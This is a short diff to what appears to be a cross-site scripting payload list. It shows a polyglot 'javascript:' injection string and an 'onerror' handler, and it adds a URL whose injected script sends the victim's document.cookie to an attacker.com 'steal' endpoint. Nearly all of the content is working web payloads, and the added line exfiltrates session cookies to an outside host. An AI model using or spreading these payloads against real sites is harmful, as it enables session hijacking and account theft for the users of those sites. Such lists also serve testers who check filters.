@@ -30,3 +30,6 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/<
   
 // DoM - this is client-side XSS within the browser executing the JavaScript. 
 ' onerror='alert()'
+
+https://example.com/page?input=<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>
+
